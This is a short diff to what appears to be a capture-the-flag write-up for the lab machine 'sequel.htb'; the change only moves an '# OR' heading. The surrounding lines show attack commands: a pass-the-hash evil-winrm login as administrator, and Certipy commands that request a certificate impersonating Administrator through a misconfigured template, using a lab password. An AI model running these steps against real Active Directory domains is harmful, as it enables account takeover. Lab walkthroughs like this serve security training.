@@ -104,6 +104,7 @@ evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
 ```
 ![image](https://github.com/user-attachments/assets/9a786f1d-7388-4793-9eb6-318c435f64df)
 
+# OR
 ```
 git clone https://github.com/ly4k/Certipy.git
 python3 setup.py install
@@ -111,7 +112,6 @@ Certipy
 ```
 ![image](https://github.com/user-attachments/assets/1bf7e649-bcca-4ca8-9648-5670bfe5b0ed)
 
-# OR
 ```
 certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -target 10.10.11.202 -template UserAuthentication -upn Administrator@sequel.htb -dns dc.sequel.htb -debug
 certipy auth -pfx administrator_dc.pfx -dc-ip 10.10.11.202
